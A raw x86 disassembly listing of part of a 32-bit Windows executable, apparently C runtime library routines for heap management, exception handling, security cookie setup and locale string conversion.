  4270f0:	jmp    0x42711e
  4270f2:	lea    ecx,[edi-0x20]
  4270f5:	shr    ebx,cl
  4270f7:	mov    ecx,DWORD PTR [ebp-0x4]
  4270fa:	lea    ecx,[eax+ecx*4+0xc4]
  427101:	lea    edi,[eax+edi*1+0x4]
  427105:	not    ebx
  427107:	and    DWORD PTR [ecx],ebx
  427109:	dec    BYTE PTR [edi]
  42710b:	mov    DWORD PTR [ebp-0x14],ebx
  42710e:	jne    0x42711b
  427110:	mov    ebx,DWORD PTR [ebp+0x8]
  427113:	mov    ecx,DWORD PTR [ebp-0x14]
  427116:	and    DWORD PTR [ebx+0x4],ecx
  427119:	jmp    0x42711e
  42711b:	mov    ebx,DWORD PTR [ebp+0x8]
  42711e:	cmp    DWORD PTR [ebp-0x8],0x0
  427122:	mov    ecx,DWORD PTR [edx+0x8]
  427125:	mov    edi,DWORD PTR [edx+0x4]
  427128:	mov    DWORD PTR [ecx+0x4],edi
  42712b:	mov    ecx,DWORD PTR [edx+0x4]
  42712e:	mov    edi,DWORD PTR [edx+0x8]
  427131:	mov    DWORD PTR [ecx+0x8],edi
  427134:	je     0x4271c7
  42713a:	mov    ecx,DWORD PTR [ebp-0xc]
  42713d:	lea    ecx,[ecx+esi*8]
  427140:	mov    edi,DWORD PTR [ecx+0x4]
  427143:	mov    DWORD PTR [edx+0x8],ecx
  427146:	mov    DWORD PTR [edx+0x4],edi
  427149:	mov    DWORD PTR [ecx+0x4],edx
  42714c:	mov    ecx,DWORD PTR [edx+0x4]
  42714f:	mov    DWORD PTR [ecx+0x8],edx
  427152:	mov    ecx,DWORD PTR [edx+0x4]
  427155:	cmp    ecx,DWORD PTR [edx+0x8]
  427158:	jne    0x4271b8
  42715a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42715e:	mov    BYTE PTR [ebp+0xb],cl
  427161:	inc    cl
  427163:	cmp    esi,0x20
  427166:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42716a:	jge    0x42718f
  42716c:	cmp    BYTE PTR [ebp+0xb],0x0
  427170:	jne    0x42717d
  427172:	mov    edi,0x80000000
  427177:	mov    ecx,esi
  427179:	shr    edi,cl
  42717b:	or     DWORD PTR [ebx],edi
  42717d:	mov    ecx,esi
  42717f:	mov    edi,0x80000000
  427184:	shr    edi,cl
  427186:	mov    ecx,DWORD PTR [ebp-0x4]
  427189:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42718d:	jmp    0x4271b8
  42718f:	cmp    BYTE PTR [ebp+0xb],0x0
  427193:	jne    0x4271a2
  427195:	lea    ecx,[esi-0x20]
  427198:	mov    edi,0x80000000
  42719d:	shr    edi,cl
  42719f:	or     DWORD PTR [ebx+0x4],edi
  4271a2:	mov    ecx,DWORD PTR [ebp-0x4]
  4271a5:	lea    edi,[eax+ecx*4+0xc4]
  4271ac:	lea    ecx,[esi-0x20]
  4271af:	mov    esi,0x80000000
  4271b4:	shr    esi,cl
  4271b6:	or     DWORD PTR [edi],esi
  4271b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4271bb:	test   ecx,ecx
  4271bd:	je     0x4271ca
  4271bf:	mov    DWORD PTR [edx],ecx
  4271c1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4271c5:	jmp    0x4271ca
  4271c7:	mov    ecx,DWORD PTR [ebp-0x8]
  4271ca:	mov    esi,DWORD PTR [ebp-0x10]
  4271cd:	add    edx,ecx
  4271cf:	lea    ecx,[esi+0x1]
  4271d2:	mov    DWORD PTR [edx],ecx
  4271d4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4271d8:	mov    esi,DWORD PTR [ebp-0xc]
  4271db:	mov    ecx,DWORD PTR [esi]
  4271dd:	test   ecx,ecx
  4271df:	lea    edi,[ecx+0x1]
  4271e2:	mov    DWORD PTR [esi],edi
  4271e4:	jne    0x427200
  4271e6:	cmp    ebx,DWORD PTR ds:0x45def8
  4271ec:	jne    0x427200
  4271ee:	mov    ecx,DWORD PTR [ebp-0x4]
  4271f1:	cmp    ecx,DWORD PTR ds:0x45df10
  4271f7:	jne    0x427200
  4271f9:	and    DWORD PTR ds:0x45def8,0x0
  427200:	mov    ecx,DWORD PTR [ebp-0x4]
  427203:	mov    DWORD PTR [eax],ecx
  427205:	lea    eax,[edx+0x4]
  427208:	pop    edi
  427209:	pop    esi
  42720a:	pop    ebx
  42720b:	leave  
  42720c:	ret    
  42720d:	int3   
  42720e:	int3   
  42720f:	int3   
  427210:	push   esi
  427211:	inc    ebx
  427212:	xor    dh,BYTE PTR [eax]
  427214:	pop    eax
  427215:	inc    ebx
  427216:	xor    BYTE PTR [eax],dh
  427218:	push   ebp
  427219:	mov    ebp,esp
  42721b:	sub    esp,0x8
  42721e:	push   ebx
  42721f:	push   esi
  427220:	push   edi
  427221:	push   ebp
  427222:	cld    
  427223:	mov    ebx,DWORD PTR [ebp+0xc]
  427226:	mov    eax,DWORD PTR [ebp+0x8]
  427229:	test   DWORD PTR [eax+0x4],0x6
  427230:	jne    0x4272b8
  427236:	mov    DWORD PTR [ebp-0x8],eax
  427239:	mov    eax,DWORD PTR [ebp+0x10]
  42723c:	mov    DWORD PTR [ebp-0x4],eax
  42723f:	lea    eax,[ebp-0x8]
  427242:	mov    DWORD PTR [ebx-0x4],eax
  427245:	mov    esi,DWORD PTR [ebx+0xc]
  427248:	mov    edi,DWORD PTR [ebx+0x8]
  42724b:	cmp    esi,0xffffffff
  42724e:	je     0x4272b1
  427250:	lea    ecx,[esi+esi*2]
  427253:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  427258:	je     0x42729f
  42725a:	push   esi
  42725b:	push   ebp
  42725c:	lea    ebp,[ebx+0x10]
  42725f:	call   DWORD PTR [edi+ecx*4+0x4]
  427263:	pop    ebp
  427264:	pop    esi
  427265:	mov    ebx,DWORD PTR [ebp+0xc]
  427268:	or     eax,eax
  42726a:	je     0x42729f
  42726c:	js     0x4272aa
  42726e:	mov    edi,DWORD PTR [ebx+0x8]
  427271:	push   ebx
  427272:	call   0x4281a0
  427277:	add    esp,0x4
  42727a:	lea    ebp,[ebx+0x10]
  42727d:	push   esi
  42727e:	push   ebx
  42727f:	call   0x4281e2
  427284:	add    esp,0x8
  427287:	lea    ecx,[esi+esi*2]
  42728a:	push   0x1
  42728c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  427290:	call   0x428276
  427295:	mov    eax,DWORD PTR [edi+ecx*4]
  427298:	mov    DWORD PTR [ebx+0xc],eax
  42729b:	call   DWORD PTR [edi+ecx*4+0x8]
  42729f:	mov    edi,DWORD PTR [ebx+0x8]
  4272a2:	lea    ecx,[esi+esi*2]
  4272a5:	mov    esi,DWORD PTR [edi+ecx*4]
  4272a8:	jmp    0x42724b
  4272aa:	mov    eax,0x0
  4272af:	jmp    0x4272cd
  4272b1:	mov    eax,0x1
  4272b6:	jmp    0x4272cd
  4272b8:	push   ebp
  4272b9:	lea    ebp,[ebx+0x10]
  4272bc:	push   0xffffffff
  4272be:	push   ebx
  4272bf:	call   0x4281e2
  4272c4:	add    esp,0x8
  4272c7:	pop    ebp
  4272c8:	mov    eax,0x1
  4272cd:	pop    ebp
  4272ce:	pop    edi
  4272cf:	pop    esi
  4272d0:	pop    ebx
  4272d1:	mov    esp,ebp
  4272d3:	pop    ebp
  4272d4:	ret    
  4272d5:	push   ebp
  4272d6:	mov    ecx,DWORD PTR [esp+0x8]
  4272da:	mov    ebp,DWORD PTR [ecx]
  4272dc:	mov    eax,DWORD PTR [ecx+0x1c]
  4272df:	push   eax
  4272e0:	mov    eax,DWORD PTR [ecx+0x18]
  4272e3:	push   eax
  4272e4:	call   0x4281e2
  4272e9:	add    esp,0x8
  4272ec:	pop    ebp
  4272ed:	ret    0x4
  4272f0:	call   0x425203
  4272f5:	add    eax,0x8
  4272f8:	ret    
  4272f9:	push   0x14
  4272fb:	push   0x429880
  427300:	call   0x425350
  427305:	mov    edi,DWORD PTR [ebp+0x8]
  427308:	xor    ebx,ebx
  42730a:	cmp    edi,ebx
  42730c:	jne    0x42731c
  42730e:	push   DWORD PTR [ebp+0xc]
  427311:	call   0x426072
  427316:	pop    ecx
  427317:	jmp    0x4274a0
  42731c:	mov    esi,DWORD PTR [ebp+0xc]
  42731f:	cmp    esi,ebx
  427321:	jne    0x42732f
  427323:	push   edi
  427324:	call   0x425f5a
  427329:	pop    ecx
  42732a:	jmp    0x42749e
  42732f:	cmp    DWORD PTR ds:0x45e144,0x3
  427336:	jne    0x42746a
  42733c:	mov    DWORD PTR [ebp-0x1c],ebx
  42733f:	cmp    esi,0xffffffe0
  427342:	ja     0x427439
  427348:	push   0x4
  42734a:	call   0x42550f
  42734f:	pop    ecx
  427350:	mov    DWORD PTR [ebp-0x4],ebx
  427353:	push   edi
  427354:	call   0x426732
  427359:	pop    ecx
  42735a:	mov    DWORD PTR [ebp-0x20],eax
  42735d:	cmp    eax,ebx
  42735f:	je     0x427409
  427365:	cmp    esi,DWORD PTR ds:0x45df04
  42736b:	ja     0x4273b9
  42736d:	push   esi
  42736e:	push   edi
  42736f:	push   eax
  427370:	call   0x426c32
  427375:	add    esp,0xc
  427378:	test   eax,eax
  42737a:	je     0x427381
  42737c:	mov    DWORD PTR [ebp-0x1c],edi
  42737f:	jmp    0x4273b9
  427381:	push   esi
  427382:	call   0x426f11
  427387:	pop    ecx
  427388:	mov    DWORD PTR [ebp-0x1c],eax
  42738b:	cmp    eax,ebx
  42738d:	je     0x4273b9
  42738f:	mov    eax,DWORD PTR [edi-0x4]
  427392:	dec    eax
  427393:	mov    DWORD PTR [ebp-0x24],eax
  427396:	cmp    eax,esi
  427398:	jb     0x42739c
  42739a:	mov    eax,esi
  42739c:	push   eax
  42739d:	push   edi
  42739e:	push   DWORD PTR [ebp-0x1c]
  4273a1:	call   0x426090
  4273a6:	push   edi
  4273a7:	call   0x426732
  4273ac:	mov    DWORD PTR [ebp-0x20],eax
  4273af:	push   edi
  4273b0:	push   eax
  4273b1:	call   0x42675d
  4273b6:	add    esp,0x18
  4273b9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4273bc:	jne    0x427409
  4273be:	cmp    esi,ebx
  4273c0:	jne    0x4273c8
  4273c2:	xor    esi,esi
  4273c4:	inc    esi
  4273c5:	mov    DWORD PTR [ebp+0xc],esi
  4273c8:	add    esi,0xf
  4273cb:	and    esi,0xfffffff0
  4273ce:	mov    DWORD PTR [ebp+0xc],esi
  4273d1:	push   esi
  4273d2:	push   ebx
  4273d3:	push   DWORD PTR ds:0x45e140
  4273d9:	call   DWORD PTR ds:0x429030
  4273df:	mov    DWORD PTR [ebp-0x1c],eax
  4273e2:	cmp    eax,ebx
  4273e4:	je     0x427409
  4273e6:	mov    eax,DWORD PTR [edi-0x4]
  4273e9:	dec    eax
  4273ea:	mov    DWORD PTR [ebp-0x24],eax
  4273ed:	cmp    eax,esi
  4273ef:	jb     0x4273f3
  4273f1:	mov    eax,esi
  4273f3:	push   eax
  4273f4:	push   edi
  4273f5:	push   DWORD PTR [ebp-0x1c]
  4273f8:	call   0x426090
  4273fd:	push   edi
  4273fe:	push   DWORD PTR [ebp-0x20]
  427401:	call   0x42675d
  427406:	add    esp,0x14
  427409:	or     DWORD PTR [ebp-0x4],0xffffffff
  42740d:	call   0x427461
  427412:	cmp    DWORD PTR [ebp-0x20],ebx
  427415:	jne    0x427439
  427417:	cmp    esi,ebx
  427419:	jne    0x42741e
  42741b:	xor    esi,esi
  42741d:	inc    esi
  42741e:	add    esi,0xf
  427421:	and    esi,0xfffffff0
  427424:	mov    DWORD PTR [ebp+0xc],esi
  427427:	push   esi
  427428:	push   edi
  427429:	push   ebx
  42742a:	push   DWORD PTR ds:0x45e140
  427430:	call   DWORD PTR ds:0x4290d4
  427436:	mov    DWORD PTR [ebp-0x1c],eax
  427439:	mov    eax,DWORD PTR [ebp-0x1c]
  42743c:	cmp    eax,ebx
  42743e:	jne    0x4274a0
  427440:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427446:	je     0x4274a0
  427448:	push   esi
  427449:	call   0x427c32
  42744e:	pop    ecx
  42744f:	test   eax,eax
  427451:	jne    0x42733c
  427457:	jmp    0x42749e
  427459:	xor    ebx,ebx
  42745b:	mov    esi,DWORD PTR [ebp+0xc]
  42745e:	mov    edi,DWORD PTR [ebp+0x8]
  427461:	push   0x4
  427463:	call   0x42547b
  427468:	pop    ecx
  427469:	ret    
  42746a:	xor    eax,eax
  42746c:	cmp    esi,0xffffffe0
  42746f:	ja     0x427487
  427471:	cmp    esi,ebx
  427473:	jne    0x427478
  427475:	xor    esi,esi
  427477:	inc    esi
  427478:	push   esi
  427479:	push   edi
  42747a:	push   ebx
  42747b:	push   DWORD PTR ds:0x45e140
  427481:	call   DWORD PTR ds:0x4290d4
  427487:	cmp    eax,ebx
  427489:	jne    0x4274a0
  42748b:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427491:	je     0x4274a0
  427493:	push   esi
  427494:	call   0x427c32
  427499:	pop    ecx
  42749a:	test   eax,eax
  42749c:	jne    0x42746a
  42749e:	xor    eax,eax
  4274a0:	call   0x42538b
  4274a5:	ret    
  4274a6:	push   0x10
  4274a8:	push   0x429890
  4274ad:	call   0x425350
  4274b2:	cmp    DWORD PTR ds:0x45e144,0x3
  4274b9:	jne    0x4274f5
  4274bb:	push   0x4
  4274bd:	call   0x42550f
  4274c2:	pop    ecx
  4274c3:	and    DWORD PTR [ebp-0x4],0x0
  4274c7:	mov    esi,DWORD PTR [ebp+0x8]
  4274ca:	push   esi
  4274cb:	call   0x426732
  4274d0:	pop    ecx
  4274d1:	mov    DWORD PTR [ebp-0x1c],eax
  4274d4:	test   eax,eax
  4274d6:	je     0x4274e3
  4274d8:	mov    esi,DWORD PTR [esi-0x4]
  4274db:	sub    esi,0x9
  4274de:	mov    DWORD PTR [ebp-0x20],esi
  4274e1:	jmp    0x4274e6
  4274e3:	mov    esi,DWORD PTR [ebp-0x20]
  4274e6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4274ea:	call   0x427513
  4274ef:	cmp    DWORD PTR [ebp-0x1c],0x0
  4274f3:	jne    0x427508
  4274f5:	push   DWORD PTR [ebp+0x8]
  4274f8:	push   0x0
  4274fa:	push   DWORD PTR ds:0x45e140
  427500:	call   DWORD PTR ds:0x4290d8
  427506:	mov    esi,eax
  427508:	mov    eax,esi
  42750a:	call   0x42538b
  42750f:	ret    
  427510:	mov    esi,DWORD PTR [ebp-0x20]
  427513:	push   0x4
  427515:	call   0x42547b
  42751a:	pop    ecx
  42751b:	ret    
  42751c:	push   ebp
  42751d:	mov    ebp,esp
  42751f:	sub    esp,0x10
  427522:	push   esi
  427523:	lea    eax,[ebp-0x8]
  427526:	push   eax
  427527:	call   DWORD PTR ds:0x4290e8
  42752d:	mov    esi,DWORD PTR [ebp-0x4]
  427530:	xor    esi,DWORD PTR [ebp-0x8]
  427533:	call   DWORD PTR ds:0x4290e4
  427539:	xor    esi,eax
  42753b:	call   DWORD PTR ds:0x42909c
  427541:	xor    esi,eax
  427543:	call   DWORD PTR ds:0x4290e0
  427549:	xor    esi,eax
  42754b:	lea    eax,[ebp-0x10]
  42754e:	push   eax
  42754f:	call   DWORD PTR ds:0x4290dc
  427555:	mov    eax,DWORD PTR [ebp-0xc]
  427558:	xor    eax,DWORD PTR [ebp-0x10]
  42755b:	xor    esi,eax
  42755d:	mov    DWORD PTR ds:0x45d430,esi
  427563:	jne    0x42756f
  427565:	mov    DWORD PTR ds:0x45d430,0xbb40e64e
  42756f:	pop    esi
  427570:	leave  
  427571:	ret    
  427572:	push   0x118
  427577:	push   0x429a40
  42757c:	call   0x425350
  427581:	mov    eax,ds:0x45d430
  427586:	xor    eax,DWORD PTR [ebp+0x4]
  427589:	mov    DWORD PTR [ebp-0x1c],eax
  42758c:	mov    eax,ds:0x45dd98
  427591:	xor    ecx,ecx
  427593:	cmp    eax,ecx
  427595:	je     0x4275b6
  427597:	mov    DWORD PTR [ebp-0x4],ecx
  42759a:	push   DWORD PTR [ebp+0xc]
  42759d:	push   DWORD PTR [ebp+0x8]
  4275a0:	call   eax
  4275a2:	pop    ecx
  4275a3:	pop    ecx
  4275a4:	or     DWORD PTR [ebp-0x4],0xffffffff
  4275a8:	jmp    0x4276b4
  4275ad:	xor    eax,eax
  4275af:	inc    eax
  4275b0:	ret    
  4275b1:	mov    esp,DWORD PTR [ebp-0x18]
  4275b4:	jmp    0x4275a4
  4275b6:	mov    eax,DWORD PTR [ebp+0x8]
  4275b9:	dec    eax
  4275ba:	je     0x4275cf
  4275bc:	mov    edi,0x429a1c
  4275c1:	mov    DWORD PTR [ebp-0x20],0x429968
  4275c8:	mov    esi,0xd4
  4275cd:	jmp    0x4275e0
  4275cf:	mov    edi,0x429948
  4275d4:	mov    DWORD PTR [ebp-0x20],0x4298a8
  4275db:	mov    esi,0xb9
  4275e0:	mov    BYTE PTR [ebp-0x24],cl
  4275e3:	push   0x104
  4275e8:	lea    eax,[ebp-0x128]
  4275ee:	push   eax
  4275ef:	push   ecx
  4275f0:	call   DWORD PTR ds:0x42906c
  4275f6:	test   eax,eax
  4275f8:	jne    0x42760d
  4275fa:	push   0x42959c
  4275ff:	lea    eax,[ebp-0x128]
  427605:	push   eax
  427606:	call   0x425730
  42760b:	pop    ecx
  42760c:	pop    ecx
  42760d:	lea    ebx,[ebp-0x128]
  427613:	lea    eax,[ebp-0x128]
  427619:	push   eax
  42761a:	call   0x425960
  42761f:	pop    ecx
  427620:	add    eax,0xb
  427623:	cmp    eax,0x3c
  427626:	jbe    0x427651
  427628:	lea    eax,[ebp-0x128]
  42762e:	push   eax
  42762f:	call   0x425960
  427634:	mov    ebx,eax
  427636:	lea    eax,[ebp-0x128]
  42763c:	sub    eax,0x31
  42763f:	add    ebx,eax
  427641:	push   0x3
  427643:	push   0x429598
  427648:	push   ebx
  427649:	call   0x425830
  42764e:	add    esp,0x10
  427651:	push   ebx
  427652:	call   0x425960
  427657:	pop    ecx
  427658:	lea    eax,[eax+esi*1+0xc]
  42765c:	add    eax,0x3
  42765f:	and    eax,0xfffffffc
  427662:	call   0x4253a0
  427667:	mov    DWORD PTR [ebp-0x18],esp
  42766a:	mov    esi,esp
  42766c:	push   edi
  42766d:	push   esi
  42766e:	call   0x425730
  427673:	mov    edi,0x429578
  427678:	push   edi
  427679:	push   esi
  42767a:	call   0x425740
  42767f:	push   0x42989c
  427684:	push   esi
  427685:	call   0x425740
  42768a:	push   ebx
  42768b:	push   esi
  42768c:	call   0x425740
  427691:	push   edi
  427692:	push   esi
  427693:	call   0x425740
  427698:	push   DWORD PTR [ebp-0x20]
  42769b:	push   esi
  42769c:	call   0x425740
  4276a1:	push   0x12010
  4276a6:	push   0x429550
  4276ab:	push   esi
  4276ac:	call   0x425632
  4276b1:	add    esp,0x3c
  4276b4:	push   0x3
  4276b6:	call   0x4247bc
  4276bb:	int3   
  4276bc:	push   0x38
  4276be:	push   0x429e60
  4276c3:	call   0x425350
  4276c8:	xor    ebx,ebx
  4276ca:	cmp    DWORD PTR ds:0x45ddbc,ebx
  4276d0:	jne    0x42770a
  4276d2:	push   ebx
  4276d3:	push   ebx
  4276d4:	xor    esi,esi
  4276d6:	inc    esi
  4276d7:	push   esi
  4276d8:	push   0x429e5c
  4276dd:	push   0x100
  4276e2:	push   ebx
  4276e3:	call   DWORD PTR ds:0x4290f4
  4276e9:	test   eax,eax
  4276eb:	je     0x4276f5
  4276ed:	mov    DWORD PTR ds:0x45ddbc,esi
  4276f3:	jmp    0x42770a
  4276f5:	call   DWORD PTR ds:0x429028
  4276fb:	cmp    eax,0x78
  4276fe:	jne    0x42770a
  427700:	mov    DWORD PTR ds:0x45ddbc,0x2
  42770a:	cmp    DWORD PTR [ebp+0x14],ebx
  42770d:	jle    0x42772a
  42770f:	mov    ecx,DWORD PTR [ebp+0x14]
  427712:	mov    eax,DWORD PTR [ebp+0x10]
  427715:	dec    ecx
  427716:	cmp    BYTE PTR [eax],bl
  427718:	je     0x427722
  42771a:	inc    eax
  42771b:	cmp    ecx,ebx
  42771d:	jne    0x427715
  42771f:	or     ecx,0xffffffff
  427722:	or     eax,0xffffffff
  427725:	sub    eax,ecx
  427727:	add    DWORD PTR [ebp+0x14],eax
  42772a:	mov    eax,ds:0x45ddbc
  42772f:	cmp    eax,0x2
  427732:	je     0x427914
  427738:	cmp    eax,ebx
  42773a:	je     0x427914
  427740:	cmp    eax,0x1
  427743:	jne    0x427947
  427749:	xor    edi,edi
  42774b:	mov    DWORD PTR [ebp-0x1c],edi
  42774e:	mov    DWORD PTR [ebp-0x20],ebx
  427751:	mov    DWORD PTR [ebp-0x24],ebx
  427754:	cmp    DWORD PTR [ebp+0x20],ebx
  427757:	jne    0x427761
  427759:	mov    eax,ds:0x45ddb4
  42775e:	mov    DWORD PTR [ebp+0x20],eax
  427761:	push   ebx
  427762:	push   ebx
  427763:	push   DWORD PTR [ebp+0x14]
  427766:	push   DWORD PTR [ebp+0x10]
  427769:	xor    eax,eax
  42776b:	cmp    DWORD PTR [ebp+0x24],ebx
  42776e:	setne  al
  427771:	lea    eax,[eax*8+0x1]
  427778:	push   eax
  427779:	push   DWORD PTR [ebp+0x20]
  42777c:	call   DWORD PTR ds:0x4290f0
  427782:	mov    esi,eax
  427784:	mov    DWORD PTR [ebp-0x28],esi
  427787:	cmp    esi,ebx
  427789:	je     0x427947
  42778f:	mov    DWORD PTR [ebp-0x4],0x1
  427796:	lea    eax,[esi+esi*1]
  427799:	add    eax,0x3
  42779c:	and    eax,0xfffffffc
  42779f:	call   0x4253a0
  4277a4:	mov    DWORD PTR [ebp-0x18],esp
  4277a7:	mov    eax,esp
  4277a9:	mov    DWORD PTR [ebp-0x2c],eax
  4277ac:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277b0:	jmp    0x4277cd
  4277b2:	xor    eax,eax
  4277b4:	inc    eax
  4277b5:	ret    
  4277b6:	mov    esp,DWORD PTR [ebp-0x18]
  4277b9:	call   0x4287e5
  4277be:	xor    ebx,ebx
  4277c0:	mov    DWORD PTR [ebp-0x2c],ebx
  4277c3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277c7:	mov    edi,DWORD PTR [ebp-0x1c]
  4277ca:	mov    esi,DWORD PTR [ebp-0x28]
  4277cd:	cmp    DWORD PTR [ebp-0x2c],ebx
  4277d0:	jne    0x4277ee
  4277d2:	lea    eax,[esi+esi*1]
  4277d5:	push   eax
  4277d6:	call   0x426072
  4277db:	pop    ecx
  4277dc:	mov    DWORD PTR [ebp-0x2c],eax
  4277df:	cmp    eax,ebx
  4277e1:	je     0x427947
  4277e7:	mov    DWORD PTR [ebp-0x20],0x1
  4277ee:	push   esi
  4277ef:	push   DWORD PTR [ebp-0x2c]
  4277f2:	push   DWORD PTR [ebp+0x14]
  4277f5:	push   DWORD PTR [ebp+0x10]
  4277f8:	push   0x1
  4277fa:	push   DWORD PTR [ebp+0x20]
  4277fd:	call   DWORD PTR ds:0x4290f0
  427803:	test   eax,eax
  427805:	je     0x4278f1
  42780b:	push   ebx
  42780c:	push   ebx
  42780d:	push   esi
  42780e:	push   DWORD PTR [ebp-0x2c]
  427811:	push   DWORD PTR [ebp+0xc]
  427814:	push   DWORD PTR [ebp+0x8]
  427817:	call   DWORD PTR ds:0x4290f4
  42781d:	mov    edi,eax
  42781f:	mov    DWORD PTR [ebp-0x1c],edi
  427822:	cmp    edi,ebx
  427824:	je     0x4278f1
  42782a:	test   BYTE PTR [ebp+0xd],0x4
  42782e:	je     0x42785d
  427830:	cmp    DWORD PTR [ebp+0x1c],ebx
  427833:	je     0x4278f1
  427839:	cmp    edi,DWORD PTR [ebp+0x1c]
  42783c:	jg     0x4278f1
  427842:	push   DWORD PTR [ebp+0x1c]
  427845:	push   DWORD PTR [ebp+0x18]
  427848:	push   esi
  427849:	push   DWORD PTR [ebp-0x2c]
  42784c:	push   DWORD PTR [ebp+0xc]
  42784f:	push   DWORD PTR [ebp+0x8]
  427852:	call   DWORD PTR ds:0x4290f4
  427858:	jmp    0x4278f1
  42785d:	mov    DWORD PTR [ebp-0x4],0x2
  427864:	lea    eax,[edi+edi*1]
  427867:	add    eax,0x3
  42786a:	and    eax,0xfffffffc
  42786d:	call   0x4253a0
  427872:	mov    DWORD PTR [ebp-0x18],esp
  427875:	mov    eax,esp
  427877:	mov    DWORD PTR [ebp-0x30],eax
  42787a:	or     DWORD PTR [ebp-0x4],0xffffffff
  42787e:	jmp    0x42789b
  427880:	xor    eax,eax
  427882:	inc    eax
  427883:	ret    
  427884:	mov    esp,DWORD PTR [ebp-0x18]
  427887:	call   0x4287e5
  42788c:	xor    ebx,ebx
  42788e:	mov    DWORD PTR [ebp-0x30],ebx
  427891:	or     DWORD PTR [ebp-0x4],0xffffffff
  427895:	mov    edi,DWORD PTR [ebp-0x1c]
  427898:	mov    esi,DWORD PTR [ebp-0x28]
  42789b:	cmp    DWORD PTR [ebp-0x30],ebx
  42789e:	jne    0x4278b8
  4278a0:	lea    eax,[edi+edi*1]
  4278a3:	push   eax
  4278a4:	call   0x426072
  4278a9:	pop    ecx
  4278aa:	mov    DWORD PTR [ebp-0x30],eax
  4278ad:	cmp    eax,ebx
  4278af:	je     0x4278f1
  4278b1:	mov    DWORD PTR [ebp-0x24],0x1
  4278b8:	push   edi
  4278b9:	push   DWORD PTR [ebp-0x30]
  4278bc:	push   esi
  4278bd:	push   DWORD PTR [ebp-0x2c]
  4278c0:	push   DWORD PTR [ebp+0xc]
  4278c3:	push   DWORD PTR [ebp+0x8]
  4278c6:	call   DWORD PTR ds:0x4290f4
  4278cc:	test   eax,eax
  4278ce:	je     0x4278f1
  4278d0:	push   ebx
  4278d1:	push   ebx
  4278d2:	cmp    DWORD PTR [ebp+0x1c],ebx
  4278d5:	jne    0x4278db
  4278d7:	push   ebx
  4278d8:	push   ebx
  4278d9:	jmp    0x4278e1
  4278db:	push   DWORD PTR [ebp+0x1c]
  4278de:	push   DWORD PTR [ebp+0x18]
  4278e1:	push   edi
  4278e2:	push   DWORD PTR [ebp-0x30]
  4278e5:	push   ebx
  4278e6:	push   DWORD PTR [ebp+0x20]
  4278e9:	call   DWORD PTR ds:0x429080
  4278ef:	mov    edi,eax
  4278f1:	cmp    DWORD PTR [ebp-0x24],ebx
  4278f4:	je     0x4278ff
  4278f6:	push   DWORD PTR [ebp-0x30]
  4278f9:	call   0x425f5a
  4278fe:	pop    ecx
  4278ff:	cmp    DWORD PTR [ebp-0x20],ebx
  427902:	je     0x42790d
  427904:	push   DWORD PTR [ebp-0x2c]
  427907:	call   0x425f5a
  42790c:	pop    ecx
  42790d:	mov    eax,edi
  42790f:	jmp    0x427a6f
  427914:	mov    DWORD PTR [ebp-0x34],ebx
  427917:	xor    edi,edi
  427919:	mov    DWORD PTR [ebp-0x38],ebx
  42791c:	cmp    DWORD PTR [ebp+0x8],ebx
  42791f:	jne    0x427929
  427921:	mov    eax,ds:0x45dda4
  427926:	mov    DWORD PTR [ebp+0x8],eax
  427929:	cmp    DWORD PTR [ebp+0x20],ebx
  42792c:	jne    0x427936
  42792e:	mov    eax,ds:0x45ddb4
  427933:	mov    DWORD PTR [ebp+0x20],eax
  427936:	push   DWORD PTR [ebp+0x8]
  427939:	call   0x4285cd
  42793e:	pop    ecx
  42793f:	mov    DWORD PTR [ebp-0x3c],eax
  427942:	cmp    eax,0xffffffff
  427945:	jne    0x42794e
  427947:	xor    eax,eax
  427949:	jmp    0x427a6f
  42794e:	cmp    eax,DWORD PTR [ebp+0x20]
  427951:	je     0x427a45
  427957:	push   ebx
  427958:	push   ebx
  427959:	lea    ecx,[ebp+0x14]
  42795c:	push   ecx
  42795d:	push   DWORD PTR [ebp+0x10]
  427960:	push   eax
  427961:	push   DWORD PTR [ebp+0x20]
  427964:	call   0x428616
  427969:	add    esp,0x18
  42796c:	mov    DWORD PTR [ebp-0x34],eax
  42796f:	cmp    eax,ebx
  427971:	je     0x427947
  427973:	push   ebx
  427974:	push   ebx
  427975:	push   DWORD PTR [ebp+0x14]
  427978:	push   eax
  427979:	push   DWORD PTR [ebp+0xc]
  42797c:	push   DWORD PTR [ebp+0x8]
  42797f:	call   DWORD PTR ds:0x4290ec
  427985:	mov    esi,eax
  427987:	mov    DWORD PTR [ebp-0x40],esi
  42798a:	cmp    esi,ebx
  42798c:	je     0x427a34
  427992:	mov    DWORD PTR [ebp-0x4],ebx
  427995:	add    eax,0x3
  427998:	and    eax,0xfffffffc
  42799b:	call   0x4253a0
  4279a0:	mov    DWORD PTR [ebp-0x18],esp
  4279a3:	mov    edi,esp
  4279a5:	mov    DWORD PTR [ebp-0x44],edi
  4279a8:	push   esi
  4279a9:	push   ebx
  4279aa:	push   edi
  4279ab:	call   0x427c50
  4279b0:	add    esp,0xc
  4279b3:	jmp    0x4279c5
  4279b5:	xor    eax,eax
  4279b7:	inc    eax
  4279b8:	ret    
  4279b9:	mov    esp,DWORD PTR [ebp-0x18]
  4279bc:	call   0x4287e5
  4279c1:	xor    ebx,ebx
  4279c3:	xor    edi,edi
  4279c5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4279c9:	cmp    edi,ebx
  4279cb:	jne    0x4279f0
  4279cd:	push   DWORD PTR [ebp-0x40]
  4279d0:	call   0x426072
  4279d5:	pop    ecx
  4279d6:	mov    edi,eax
  4279d8:	cmp    edi,ebx
  4279da:	je     0x427a0d
  4279dc:	push   DWORD PTR [ebp-0x40]
  4279df:	push   ebx
  4279e0:	push   edi
  4279e1:	call   0x427c50
  4279e6:	add    esp,0xc
  4279e9:	mov    DWORD PTR [ebp-0x38],0x1
  4279f0:	push   DWORD PTR [ebp-0x40]
  4279f3:	push   edi
